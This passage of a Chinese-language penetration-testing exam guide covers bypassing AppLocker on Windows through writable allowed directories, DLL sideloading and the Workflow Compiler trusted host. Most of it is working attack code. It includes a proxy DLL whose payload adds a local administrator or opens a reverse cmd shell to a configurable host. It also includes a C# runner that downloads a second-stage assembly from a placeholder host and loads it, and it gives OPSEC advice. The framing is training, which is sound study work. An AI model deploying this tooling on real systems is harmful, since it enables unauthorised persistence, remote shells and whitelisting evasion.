    Write-Output "[*] 排查顺序：① 是否被 AMSI 拦（先做 m05-amsi-bypass-variants.ps1）"
    Write-Output "             ② 程序集是否被静态查杀（换自定义 Runner / XOR 编码）"
    Write-Output "             ③ 入口签名是否匹配（用 -ListTypes 看类型）"
    exit 1
}
````

**验证**：`$asm.FullName` 是否成功返回；反射调用是否返回预期结果；有无落地文件产生。

**失败分支与备选**：
1. 工具是原生 EXE（非托管）→ 不能反射加载 → 改用 InstallUtil/宿主（场景 23）或找同功能的托管替代。
2. `Assembly.Load` 被 AMSI/CLM 拦 → 先做 AMSI 处理与 Runspace 绕过（本模块脚本），再加载。
3. 依赖缺失 → 用 `AssemblyResolve` 内存解析，或把依赖目录加入 `AppDomain.BaseDirectory`。

**考试注意 / OPSEC**：反射调用不会产生新的进程，日志面更小；但参数必须与工具入口严格匹配，考试前先在本机验证一遍调用签名。

---

## 场景 21：普通 EXE 被 AppLocker 拒绝，但特定目录存在允许规则

**场景回顾**：你有普通用户会话，上传的程序在当前目录不能运行；有效策略允许某些路径，其中可能存在当前用户可写的位置。

**前提与假设**：
- AppLocker 的 EXE 规则集生效，默认路径（如 `C:\Users\Public`）被拒。
- 策略中存在允许目录（常见：`C:\Windows\Tasks`、`C:\Windows\Temp`、用户 profile 下某些目录）。
- 当前用户对这些目录有写权限。

**准备（攻击机侧）**：无需特殊准备，用脚本枚举即可。

**执行步骤**：
1. 枚举有效策略（注意 CLM 下可能无法解析 XML，用脚本兜底）：
   ```powershell
   Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml
   # 或
   Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
   ```
2. 提取允许路径：
   ```powershell
   (Get-AppLockerPolicy -Effective).RuleCollections |
     Where-Object CollectionType -eq 'Exe' |
     ForEach-Object { $_.GetRules() } |
     Where-Object Action -eq 'Allow' |
     Select-Object -ExpandProperty Conditions
   ```
3. 对每个候选目录检查写权限：
   ```powershell
   icacls "C:\Windows\Tasks"
   # 或
   accesschk.exe -w "C:\Windows\Tasks" -accepteula
   ```
4. 把 payload 投递到"允许 + 可写"的目录，从那里执行。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m05-applocker-enum.ps1` | 枚举有效规则 + 可写允许路径 | `-PayloadPath` 可选 |

#### `m05-applocker-enum.ps1` {#m05-applocker-enum-ps1}

````powershell
<#
用途：枚举 AppLocker 有效策略、可写允许路径与 DLL 规则集状态，输出可直接使用的执行目录候选
场景：21、22（以及 18/23/24 的前置判断）
依赖：PowerShell 3.0+；Get-AppLockerPolicy 需 Win10+/Server 2016+ 且 AppLocker 服务已启动
使用：powershell -ep bypass -f m05-applocker-enum.ps1
      可选：-ExtraDirs "C:\Custom\Path" 追加待检查目录
占位符：无（如需把 payload 放到候选目录，用 -PayloadSource 指定本地路径）
测试状态：未在 Windows 实测；已人工检查语法
说明：
  - CLM 下 Get-AppLockerPolicy 可能无法解析对象，脚本会自动回退到 -Xml 落地解析。
  - 输出按"允许 + 可写"排序，最后给出建议的执行目录。
#>
[CmdletBinding()]
param(
    [string[]]$ExtraDirs = @(),
    [string]$OutFile = "$env:TEMP\applocker-report.txt"
)

function Write-Both($text) { Write-Output $text; Add-Content -Path $OutFile -Value $text -ErrorAction SilentlyContinue }

"" | Out-File -FilePath $OutFile -Encoding utf8 -ErrorAction SilentlyContinue
Write-Both ("=== AppLocker 枚举 {0} ===" -f (Get-Date))
Write-Both ("当前用户: {0}" -f (whoami))
Write-Both ("语言模式: {0}" -f $ExecutionContext.SessionState.LanguageMode)

# ---------- 1. 服务与策略可用性 ----------
Write-Both "`n--- 服务状态 ---"
try {
    $svc = Get-Service AppIDSvc -ErrorAction Stop
    Write-Both ("AppIDSvc: {0}" -f $svc.Status)
} catch { Write-Both "AppIDSvc: 查询失败（可能未安装 AppLocker）" }

# ---------- 2. 有效策略 ----------
Write-Both "`n--- 有效策略 ---"
$policy = $null
try {
    $policy = Get-AppLockerPolicy -Effective -ErrorAction Stop
    Write-Both "[+] Get-AppLockerPolicy -Effective 成功"
} catch {
    Write-Both ("[-] -Effective 失败: {0}" -f $_.Exception.Message)
    try {
        $xml = Get-AppLockerPolicy -Effective -Xml -ErrorAction Stop
        $xml | Out-File "$env:TEMP\al-effective.xml" -Encoding utf8
        Write-Both "[+] 已落地 XML: $env:TEMP\al-effective.xml（可离线解析）"
    } catch { Write-Both ("[-] -Xml 也失败: {0}" -f $_.Exception.Message) }
}

$allowPaths = New-Object System.Collections.Generic.List[string]
$ruleSummary = @()
if ($policy) {
    foreach ($rc in $policy.RuleCollections) {
        $rules = @()
        try { $rules = $rc.GetRules() } catch { $rules = @() }
        $ruleSummary += ("{0}: {1} 条规则, 强制模式={2}" -f $rc.CollectionType, $rules.Count, $rc.EnforcementMode)
        foreach ($r in $rules) {
            if ($r.Action -ne 'Allow') { continue }
            foreach ($c in $r.Conditions) {
                # PathCondition / FilePublisherCondition / FileHashCondition
                if ($c.PSObject.Properties.Name -contains 'Path') {
                    $allowPaths.Add([string]$c.Path)
                }
            }
        }
    }
}
Write-Both ("`n--- 规则概览 ---`n" + ($ruleSummary -join "`n"))
Write-Both ("`n--- 允许路径 ---`n" + (($allowPaths | Sort-Object -Unique) -join "`n"))

# ---------- 3. DLL 规则集 ----------
Write-Both "`n--- DLL 规则集 ---"
if ($policy) {
    $dll = $policy.RuleCollections | Where-Object { $_.CollectionType -eq 'Dll' }
    if ($dll) { Write-Both ("DLL 规则集存在，强制模式={0}" -f $dll.EnforcementMode) }
    else { Write-Both "[+] 未发现 DLL 规则集 → 场景 22 的 DLL 路线通常可行" }
}

# ---------- 4. 候选目录写权限 ----------
$candidates = @(
    "C:\Windows\Tasks", "C:\Windows\Temp", "C:\Windows\System32\spool\drivers\color",
    "$env:TEMP", "$env:APPDATA", "$env:LOCALAPPDATA", "C:\Users\Public", "C:\ProgramData"
) + $ExtraDirs

Write-Both "`n--- 候选目录可写性 ---"
$writable = @()
foreach ($d in ($candidates | Sort-Object -Unique)) {
    if (-not (Test-Path $d)) { Write-Both ("[ ] 不存在: {0}" -f $d); continue }
    $canWrite = $false
    try {
        $probe = Join-Path $d (".w_" + [guid]::NewGuid().ToString('N').Substring(0,8))
        [IO.File]::WriteAllText($probe, "x")
        Remove-Item $probe -Force -ErrorAction SilentlyContinue
        $canWrite = $true
    } catch { $canWrite = $false }
    $flag = if ($canWrite) { "[+] 可写" } else { "[-] 不可写" }
    Write-Both ("{0} {1}" -f $flag, $d)
    if ($canWrite) { $writable += $d }
}

# ---------- 5. 结论 ----------
Write-Both "`n=== 结论 ==="
if ($writable.Count -gt 0) {
    Write-Both ("建议优先尝试的执行目录（按可写性筛选）：`n" + ($writable -join "`n"))
    Write-Both "`n下一步：把 payload 投递到上述目录后直接运行；若被策略拒绝，说明该目录不在允许列表内。"
} else {
    Write-Both "未找到可写目录 → 转 DLL 路线（场景 22）或受信任宿主（场景 23/24）。"
}
Write-Both ("`n报告已保存: {0}" -f $OutFile)
````

**验证**：在目标目录直接运行 `cmd /c whoami` 或你的 payload，确认不再被策略阻止；`Test-Path` 与 `icacls` 输出留档。

**失败分支与备选**：
1. 没有可写允许目录 → 转 DLL 路线（场景 22）或受信任宿主（场景 23、24）。
2. 策略解析被 CLM 限制 → 用 `Get-AppLockerPolicy -Effective -Xml` 落地后离线解析，或直接暴力试探常见目录。
3. 允许目录存在但 Defender 拦 payload → 结合场景 18 的编码方案。

**考试注意 / OPSEC**：AppLocker 只限制"从哪里启动"，不限制"启动什么"之外的行为；先确认策略版本（`Get-AppLockerPolicy -Effective` 在 Win10+ 才可用），旧系统用 `Get-AppLockerPolicy -Local` 或直接读 `%windir%\System32\AppLocker\*.xml`。

---

## 场景 22：EXE 规则严格，但 DLL 规则和宿主允许条件不同

**场景回顾**：普通自定义程序不能直接启动，但一个已允许的应用能加载外部 DLL，且对应 DLL 加载没有被有效规则阻止。

**前提与假设**：
- AppLocker 的 DLL 规则集未启用或较宽松（默认不启用 DLL 规则）。
- 存在一个被允许、且会从可影响位置加载 DLL 的宿主程序。

**准备（攻击机侧）**：
```bash
# 用 Proxy DLL 思路：导出全转发 + DllMain 中执行载荷
x86_64-w64-mingw32-gcc -shared -o hijack.dll m04-proxy-dll-sideload.c proxy.def -s
```

**执行步骤**：
1. 确认 DLL 规则集状态：
   ```powershell
   (Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
   ```
   `Dll` 类型不存在或为 AuditOnly → DLL 路线可行。
2. 找到允许的宿主程序及其 DLL 搜索路径（同目录优先）。
3. 把 DLL 放到宿主的搜索路径，保持导出函数与调用约定与原 DLL 一致（见 [04-dll-sideloading](/zh/modules/04-dll-sideloading) 场景 12）。
4. 启动宿主，确认载荷执行且宿主功能正常。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m04-proxy-dll-sideload.c` | 全转发 Proxy DLL | 替换原 DLL 名 |
| `m04-proxy-dll-newadmin.c` | DLL 载荷（加管理员/反连） | LHOST/LPORT |
| `m04-build-sideload-package.py` | 打包宿主 + DLL | 宿主版本、架构 |

#### `m04-proxy-dll-sideload.c` {#m04-proxy-dll-sideload-c}

````c
/*
 * m04-proxy-dll-sideload.c
 *
 * 用途：DLL 旁加载的"纯转发 / 无载荷对照"Proxy。编译出的 DLL 与宿主原
 *       DLL 同名（如 legit.dll），把原 DLL 全部导出通过 forward.def 转发
 *       给同目录改名后的原文件（original.dll），宿主功能完全不受影响。
 *       本文件不携带任何载荷——用于场景 12 的变量隔离：先证明"转发正确、
 *       宿主不崩"，再换成实弹版 m04-proxy-dll-newadmin.c。
 * 场景：M04 · 场景 11（兼容性验证）/ 场景 12（闪退排查第一步）
 * 依赖：MinGW-w64 或 MSVC；原 DLL 的导出清单（objdump -p / dumpbin /exports）
 * 使用：
 *   # 先按导出清单生成 forward.def（内容形如 "Foo = original.Foo"，见文档 §2）
 *   x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-sideload.c forward.def
 *   strip legit.dll
 *   # MSVC：cl /LD m04-proxy-dll-sideload.c /Fe:legit.dll /link /DEF:forward.def
 * 占位符：无（纯转发，无网络/账号动作）；文件内仅供调试的宏均默认关闭。
 * 测试状态：未实测（无靶机）；语法与链接方式按 MinGW 常规用法编写，首次使用
 *   请在复刻 VM 用 "宿主 + original.dll 改名同目录" 验证宿主正常启动。
 */

#include <windows.h>

/*
 * DLL_PROCESS_ATTACH 里只做最小动作并返回 TRUE。
 * 规则：DllMain 运行在加载器锁内——不 LoadLibrary、不等待、不做网络 I/O。
 * 若需要确认"我们的 DLL 确实被加载"（仅本地排障，靶机上会留痕迹）：
 *   定义宏 DEBUG_LOADED 会在 %TEMP%\m04-sideload-loaded.txt 写一行时间戳。
 */
#ifdef DEBUG_LOADED
#include <stdio.h>
static void NoteLoaded(void)
{
    char path[MAX_PATH];
    FILE *f;
    if (!GetTempPathA(MAX_PATH, path))
        return;
    lstrcatA(path, "m04-sideload-loaded.txt");
    f = fopen(path, "a");
    if (f) {
        fprintf(f, "proxy loaded into pid %lu\n", GetCurrentProcessId());
        fclose(f);
    }
}
#endif

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
#ifdef DEBUG_LOADED
        NoteLoaded();
#endif
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * 可选的 rundll32 测试入口：rundll32 legit.dll,Run 可脱离宿主单独验证本 DLL
 * 能被加载并调用（用于场景 12 判断"是宿主环境问题还是 DLL 问题"）。
 * 注意：真实投递包里的 DLL 文件名必须是宿主加载的名字，不要依赖此入口。
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    /* 空实现：仅证明加载/调用链可用 */
}

/*
 * 说明：所有转发导出由 forward.def 提供，不在 C 源码里声明——
 * 避免手写每个函数的签名（签名错 = 调用约定错 = 场景 12 闪退）。
 * 若 .def 转发在你的工具链上不被支持（个别旧版 binutils），回退方案：
 *   1) 用 MSVC link.exe /DEF:forward.def 编译；
 *   2) 或改用 m04-proxy-dll-cpp.cpp 里的"手写少量转发"模式（函数少时）。
 */
````

#### `m04-proxy-dll-newadmin.c` {#m04-proxy-dll-newadmin-c}

````c
/*
 * m04-proxy-dll-newadmin.c
 *
 * 用途：DLL 旁加载的"实弹"Proxy —— 转发保持宿主正常的同时执行载荷，
 *       支持两种编译期模式：
 *         MODE_NETUSER（默认）：创建本地管理员账号（cheat sheet "New Admin
 *                   with C" 路线），适合宿主以提升权限运行时；
 *         MODE_REVERSE：反连 TCP shell，适合普通用户权限拿到交互式会话。
 *       所有转发导出仍由 forward.def 提供（与 m04-proxy-dll-sideload.c 相同）。
 * 场景：M04 · 场景 11（主投递载荷）；场景 12（确认转发无误后接上载荷）
 * 依赖：MinGW-w64 / MSVC；ws2_32、netapi32；
 *       forward.def（由原 DLL 导出清单生成，见 docs/04-dll-sideloading.md）
 * 使用：
 *   反连模式（Kali 交叉编译）：
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lws2_32 -lnetapi32 -DMODE_REVERSE \
 *       -DLHOST=L\"10.0.0.5\" -DLPORT=L\"4444\"
 *   加管理员模式：
 *     x86_64-w64-mingw32-gcc -shared -O2 -o legit.dll m04-proxy-dll-newadmin.c forward.def \
 *       -lnetapi32 -DMODE_NETUSER \
 *       -DADMIN_USER=L\"ExamUser\" -DADMIN_PASS=L\"ExamPass!23\"
 *   编译出的 DLL 改名为宿主加载的名字（如 legit.dll）放进宿主目录。
 * 占位符：LHOST / LPORT（反连目标）、USER / PASS（新账号，默认值仅占位，
 *       编译前必须 -D 覆盖）。 目标机器上若不加 -D 覆盖会创建字面量
 *       "USER"/"PASS" 账号 —— 考试时务必替换。
 * 测试状态：未实测。语法按 MinGW-w64 常规编写，未在靶机验证；首次使用先在本
 *   机 VM 用无载荷版 m04-proxy-dll-sideload.c 跑通转发，再编译本文件只验载荷。
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <stdlib.h>

/* MSVC 用的自动链接；MinGW 需在命令行 -lws2_32 -lnetapi32 */
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "netapi32.lib")

#ifndef MODE_NETUSER
#ifndef MODE_REVERSE
#define MODE_NETUSER          /* 默认：加管理员 */
#endif
#endif

#ifndef LHOST
#define LHOST L"127.0.0.1"    /* 占位符，编译时必须覆盖 */
#endif
#ifndef LPORT
#define LPORT L"4444"
#endif
#ifndef ADMIN_USER
#define ADMIN_USER L"USER"    /* 占位符，编译时必须覆盖 */
#endif
#ifndef ADMIN_PASS
#define ADMIN_PASS L"PASS"
#endif

/* ---------- 模式一：创建本地管理员（cheat sheet: New Admin with C） ---------- */

static DWORD AddAdminUser(void)
{
    NET_API_STATUS rc;
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_0 gm;
    SID_NAME_USE snu;
    BYTE sid[256];
    DWORD cbSid = sizeof(sid);
    DWORD cbDomain = sizeof(sid) / sizeof(WCHAR);
    WCHAR domain[256];

    ZeroMemory(&ui, sizeof(ui));
    ui.usri1_name        = (LPWSTR)ADMIN_USER;
    ui.usri1_password    = (LPWSTR)ADMIN_PASS;
    ui.usri1_priv        = USER_PRIV_USER;               /* 创建时不能直接给管理员 */
    ui.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;
    ui.usri1_script_path = NULL;

    rc = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);         /* 本地服务器 */
    if (rc != NERR_Success)
        return rc;

    if (!LookupAccountNameW(NULL, (LPWSTR)ADMIN_USER, sid, &cbSid,
                            domain, &cbDomain, &snu))
        return (DWORD)GetLastError();

    gm.lgrmi0_sid = (PSID)sid;
    rc = NetLocalGroupAddMembers(NULL, L"Administrators", 0, (LPBYTE)&gm, 1);
    return rc;
}

static DWORD WINAPI NetUserThread(LPVOID ctx)
{
    (void)ctx;
    AddAdminUser();
    return 0;
}

/* ---------- 模式二：反连 TCP shell ---------- */

static DWORD WINAPI ReverseThread(LPVOID ctx)
{
    WSADATA wsa;
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in sa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR cmdline[] = L"cmd.exe";

    (void)ctx;
    Sleep(2000);                                   /* 等宿主 UI 先出现 */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET)
        goto fail;

    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)_wtoi(LPORT));
    if (InetPtonW(AF_INET, LHOST, &sa.sin_addr) != 1)
        goto fail;

    if (WSAConnect(s, (const struct sockaddr *)&sa, sizeof(sa),
                   NULL, NULL, NULL, NULL) != 0)
        goto fail;

    /* 让 socket 句柄可被子进程继承，作为 cmd 的标准句柄 */
    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        goto fail;

    WaitForSingleObject(pi.hProcess, INFINITE);    /* cmd 退出前保持 socket */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    return 0;

fail:
    if (s != INVALID_SOCKET)
        closesocket(s);
    WSACleanup();
    return 1;
}

/* ---------- 入口 ---------- */

static void LaunchPayload(void)
{
    HANDLE h;
#ifdef MODE_REVERSE
    h = CreateThread(NULL, 0, ReverseThread, NULL, 0, NULL);
#else
    h = CreateThread(NULL, 0, NetUserThread, NULL, 0, NULL);
#endif
    if (h != NULL)
        CloseHandle(h);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        /* 加载器锁内禁止重活/等待：只开线程，动作全部放线程里 */
        LaunchPayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

/*
 * rundll32 独立测试入口：rundll32 legit.dll,Run
 * 可在不带宿主的情况下验证载荷；真实旁加载时 DllMain 已触发，此入口仅排障用。
 */
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
                                        LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    LaunchPayload();
}
````

#### `m04-build-sideload-package.py` {#m04-build-sideload-package-py}

````python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# m04-build-sideload-package.py
#
# 用途：把 DLL 旁加载目录包打成 ZIP 交付件，并在打包前做一致性校验：
#       - 目录里所有 PE 文件架构一致（x86/x64，混装必闪退 = 场景 12）；
#       - "宿主加载名 DLL"（proxy）与 "改名原 DLL" 都必须在场；
#       - proxy 的导出函数数量与原 DLL 对齐（全量转发才保证宿主不崩；
#         数量对不上说明 forward.def 漏了导出，是闪退主因）。
#       输出 ZIP + SHA256，便于投递后核验文件未被篡改。
# 场景：M04 · 场景 11 投递前准备 / 场景 12 导出转发自查
# 依赖：Python 3 标准库（无需 pefile）；目录内是编译好的宿主与 DLL
# 使用：
#   python3 m04-build-sideload-package.py \
#       --input-dir ./sideload --dll-name legit.dll --original-name original.dll \
#       --out sideload-pkg.zip
#   目录期望布局（原样打进 ZIP，外层套一个 <top-dir> 文件夹）：
#     sideload/
#       RunHost.exe     宿主（原版不动）
#       legit.dll       proxy（已编好并改成宿主加载的名字，由 --dll-name 指定）
#       original.dll    原版 legit.dll 改名后的转发目标
#       其它文件/子目录  诱饵，保持业务外观
# 占位符：无（文件名由参数传入）
# 测试状态：未实测；PE 解析按标准结构编写（MZ->PE->可选头->导出目录），
#   建议先在复刻 VM 上用真实宿主/原 DLL 跑一遍 --dry-run 校验输出再投递。

import argparse
import hashlib
import os
import struct
import sys
import zipfile

MACHINE = {0x14C: "x86 (PE32)", 0x8664: "x64 (PE32+)", 0x1C0: "ARM", 0xAA64: "ARM64"}
EXP_DIR_IDX = 0  # IMAGE_DIRECTORY_ENTRY_EXPORT

class PeInfo(object):
    def __init__(self, path, arch, n_exports):
        self.path = path
        self.arch = arch            # 0x14C / 0x8664 / None
        self.n_exports = n_exports  # 名字导出数（转发/原 DLL 都应有值）

    def __repr__(self):
        return "%s arch=%s exports=%d" % (
            os.path.basename(self.path),
            MACHINE.get(self.arch, "unknown(0x%X)" % self.arch) if self.arch else "not-PE",
            self.n_exports)

def _u16(buf, off):
    return struct.unpack_from("<H", buf, off)[0]

def _u32(buf, off):
    return struct.unpack_from("<I", buf, off)[0]

def _read_cstr(buf, off):
    end = buf.find(b"\x00", off)
    return buf[off:end].decode("latin-1", "replace") if end != -1 else ""

def parse_pe(path):
    """返回 (arch_machine, n_export_names)；非 PE/解析失败抛 ValueError。"""
    with open(path, "rb") as f:
        buf = f.read()
    if buf[:2] != b"MZ":
        raise ValueError("no MZ header")
    pe = _u32(buf, 0x3C)
    if pe + 6 > len(buf) or buf[pe:pe + 4] != b"PE\x00\x00":
        raise ValueError("no PE signature")
    arch = _u16(buf, pe + 4)
    n_sec = _u16(buf, pe + 6)
    opt_size = _u16(buf, pe + 20)
    opt = pe + 24
    magic = _u16(buf, opt)
    if magic == 0x10B:
        dd_base = opt + 96           # PE32 数据目录偏移
    elif magic == 0x20B:
        dd_base = opt + 112          # PE32+ 数据目录偏移
    else:
        raise ValueError("unknown optional header magic 0x%X" % magic)

    sections = []
    sec = opt + opt_size
    for i in range(n_sec):
        s = sec + i * 40
        sections.append((_u32(buf, s + 12),     # VirtualAddress
                         _u32(buf, s + 8),      # VirtualSize
                         _u32(buf, s + 20),     # PointerToRawData
                         _u32(buf, s + 16)))    # SizeOfRawData

    def rva2off(rva):
        for va, vs, raw, size in sections:
            if va <= rva < va + max(vs, size):
                off = raw + (rva - va)
                if 0 <= off < len(buf):
                    return off
        return None

    n_names = 0
    exp_rva = _u32(buf, dd_base + 8 * EXP_DIR_IDX)
    exp_off = rva2off(exp_rva) if exp_rva else None
    if exp_off is not None:
        n_names = _u32(buf, exp_off + 24)          # NumberOfNames
        names_rva = _u32(buf, exp_off + 32)        # AddressOfNames (RVA 表)
        base = rva2off(names_rva)
        if base is not None:
            for i in range(min(n_names, 64)):      # 只抽查前 64 个名字可读
                no = rva2off(_u32(buf, base + i * 4))
                if no is None or not _read_cstr(buf, no):
                    raise ValueError("export name table corrupt")
    return arch, n_names

def main(argv):
    ap = argparse.ArgumentParser(description="Build & validate a DLL sideload ZIP package")
    ap.add_argument("--input-dir", required=True, help="目录：宿主 + proxy DLL + 改名原 DLL + 诱饵")
    ap.add_argument("--dll-name", required=True, help="宿主实际加载的 DLL 文件名（= proxy 的名字）")
    ap.add_argument("--original-name", default="original.dll", help="原 DLL 改名后的文件")
    ap.add_argument("--out", default="sideload-pkg.zip", help="输出 ZIP")
    ap.add_argument("--top-dir", default="", help="ZIP 内顶层文件夹名（默认 <input 目录名>-pkg）")
    args = ap.parse_args(argv)

    indir = args.input_dir
    if not os.path.isdir(indir):
        print("[-] input dir not found: %s" % indir)
        return 1
    top = args.top_dir or (os.path.basename(os.path.abspath(indir)) + "-pkg")

    ppe = os.path.join(indir, args.dll_name)
    porig = os.path.join(indir, args.original_name)
    if not os.path.isfile(ppe):
        print("[-] proxy DLL missing (host-loaded name): %s" % ppe)
        return 1
    if not os.path.isfile(porig):
        print("[-] renamed original DLL missing: %s" % porig)
        return 1

    # 1) 目录内所有 PE 架构必须一致
    arch0 = None
    for name in sorted(os.listdir(indir)):
        p = os.path.join(indir, name)
        if os.path.isdir(p):
            continue
        try:
            arch, _ = parse_pe(p)
        except ValueError:
            print("[!] skip non-PE file: %s" % name)
            continue
        if arch not in MACHINE:
            print("[!] skip unknown-arch PE: %s" % name)
            continue
        if arch0 is None:
            arch0 = arch
            print("[*] PE arch baseline: %s" % MACHINE[arch])
        elif arch != arch0:
            print("[-] arch mismatch: %s is %s, baseline is %s" % (
                name, MACHINE.get(arch, hex(arch)), MACHINE[arch0]))
            return 1

    # 2) proxy 与原 DLL 导出函数数量对齐（全量转发检查）
    _, n_proxy = parse_pe(ppe)
    _, n_orig = parse_pe(porig)
    print("[*] %s exports=%d | %s exports=%d" % (
        args.dll_name, n_proxy, args.original_name, n_orig))
    if n_proxy == 0:
        print("[-] proxy exports 0 names: forward.def 没生效或 .def 为空，宿主将因缺导入闪退")
        return 1
    if n_proxy != n_orig:
        print("[!] export count mismatch (%d != %d): forward.def 漏导出或含多余导出，"
              "宿主可能闪退；请用 dumpbin/objdump 对比导出表" % (n_proxy, n_orig))

    # 3) 打包：顶层套 top 文件夹，保留相对结构
    with zipfile.ZipFile(args.out, "w", zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(indir):
            dirs.sort()
            for name in sorted(files):
                full = os.path.join(root, name)
                rel = os.path.relpath(full, indir)
                z.write(full, os.path.join(top, rel))
    sha = hashlib.sha256(open(args.out, "rb").read()).hexdigest()
    print("[+] wrote %s (%d bytes) sha256=%s" % (args.out, os.path.getsize(args.out), sha))
    print("[*] manual checks before delivery: 1) 复刻 VM 上解压双击宿主应正常启动"
          "且载荷生效; 2) ProcMon 确认 Load Image 命中 top/%s; 3) 版本与目标一致"
          % args.dll_name)
    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
````

**验证**：宿主是否正常启动（不闪退）；DLL 中的载荷是否执行；`whoami` 或回连确认。

**失败分支与备选**：
1. DLL 规则集启用且严格 → 转受信任宿主（场景 23、24）。
2. 宿主闪退 → 导出表/调用约定不匹配（`docs/04` 场景 12）。
3. 宿主不加载同目录 DLL → 找其它支持旁加载的宿主，或用 `PATH` 劫持。

**考试注意 / OPSEC**：AppLocker 的 DLL 规则默认不启用——这是考试中最省事的路径之一；但别把它当作必然，先查策略。

---

## 场景 23：InstallUtil 不可用，但教材中的其他受信任执行宿主可用

**场景回顾**：InstallUtil 路线被策略阻止，目标却保留了 Workflow 编译宿主及其所需环境。

**前提与假设**：
- AppLocker 阻止 InstallUtil（或其被移出允许列表）。
- `Microsoft.Workflow.Compiler.exe` 存在且可执行（.NET Framework 4.0 目录）。

**准备（攻击机侧）**：
```bash
# 编译 Workflow 输入程序集（含 XOML 逻辑的托管程序集）
x86_64-w64-mingw32-gcc ...   # 不需要，用 csc.exe 编译 C# 即可
# 目标机上：
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
```

**执行步骤**：
1. 确认宿主存在：
   ```powershell
   Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
   ```
2. 准备 XOML + 程序集（或直接用程序集入口）。
3. 调用：
   ```cmd
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe payload.xoml output.xml
   ```
4. 确认载荷执行（回连/落地文件）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m05-workflow-compiler-runner.cs` | Workflow 宿主输入程序集 | 替换载荷逻辑 |
| `m05-lolbas-notes.md` | 受信任宿主速查 | — |

#### `m05-workflow-compiler-runner.cs` {#m05-workflow-compiler-runner-cs}

````csharp
// 用途：Workflow Compiler 受信任宿主——被 Microsoft.Workflow.Compiler.exe 加载执行的程序集
// 场景：23（InstallUtil 被策略阻止，但 Workflow 编译宿主及其环境仍可用）
// 依赖：.NET Framework 4.x；目标存在 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
// 使用：
//   csc.exe /target:library /out:payload.dll m05-workflow-compiler-runner.cs
//   Microsoft.Workflow.Compiler.exe payload.xoml output.xml
// 占位符：LHOST/LPORT（回连地址）、STAGE2_URL
// 测试状态：未编译验证（本机无 csc）；语法已人工检查
//
// 说明：
//   - 该宿主会编译并运行 XOML 工作流；把载荷逻辑放在程序集的静态方法里，
//     由 XOML 里的 CodeActivity 或直接由宿主加载调用。
//   - 若 XOML 不便生成，可用宿主加载本程序集并调用 Run()（部分版本支持 -r 参数指定程序集）。
//   - 命令要写全路径，不要依赖 PATH（AppLocker 按路径匹配规则）。

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

namespace Payload
{
    public static class Runner
    {
        private const string STAGE2_URL = "http://LHOST/stage2.b64";  // ← 替换

        public static void Run()
        {
            try
            {
                if (!STAGE2_URL.Contains("LHOST"))
                {
                    byte[] enc = new WebClient().DownloadData(STAGE2_URL);
                    Assembly asm = Assembly.Load(enc);
                    foreach (Type t in asm.GetTypes())
                    {
